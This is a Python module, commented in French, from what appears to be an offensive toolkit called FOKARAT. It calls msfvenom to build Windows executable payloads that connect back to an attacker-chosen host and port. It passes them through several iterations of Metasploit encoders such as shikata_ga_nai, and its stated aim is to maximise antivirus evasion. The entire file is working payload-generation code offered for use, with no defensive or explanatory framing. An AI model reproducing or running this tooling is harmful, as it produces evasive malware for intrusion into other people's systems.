"""
FOKARAT - Multi-encodage MSFVenom
Utilise plusieurs encodeurs pour maximiser l'évasion.
"""
import subprocess
import os
from core.logger import Logger
from core.utils import which

logger = Logger()


ENCODERS = {
    "1": ("x86/shikata_ga_nai", "Polymorphe x86 (recommandé)"),
    "2": ("x64/xor_dynamic", "XOR dynamique x64"),
    "3": ("x86/countdown", "Compteur décroissant x86"),
    "4": ("x86/fnstenv_mov", "FNSTENV+MOV x86"),
    "5": ("x86/jmp_call_additive", "JMP/CALL additif x86"),
    "6": ("x86/alpha_mixed", "Alpha mixte alphanumérique"),
    "7": ("cmd/powershell_base64", "PowerShell Base64"),
}


class MultiEncoder:

    def list_encoders(self):
        print("\n  Encodeurs disponibles :")
        for k, (enc, desc) in ENCODERS.items():
            print(f"    [{k}] {enc:<28} {desc}")

    def encode(self, payload, lhost, lport, output, encoder_key="1", iterations=5):
        if not which("msfvenom"):
            logger.error("msfvenom absent. sudo apt install metasploit-framework")
            return None

        if encoder_key not in ENCODERS:
            logger.error("Encodeur invalide.")
            return None

        encoder, name = ENCODERS[encoder_key]
        logger.info(f"Encodage : {name} x{iterations}")

        cmd = [
            "msfvenom", "-p", payload,
            f"LHOST={lhost}", f"LPORT={lport}",
            "-e", encoder, "-i", str(iterations),
            "-f", "exe", "-o", output,
            "--platform", "windows", "-a", "x86",
        ]

        try:
            subprocess.run(cmd, check=True, capture_output=True, text=True)
            if os.path.exists(output) and os.path.getsize(output) > 0:
                logger.success(f"Payload encodé : {output} ({os.path.getsize(output)} o)")
                return output
            logger.error("Fichier vide généré.")
            return None
        except subprocess.CalledProcessError as e:
            logger.error(f"Échec : {e.stderr or e}")
            return None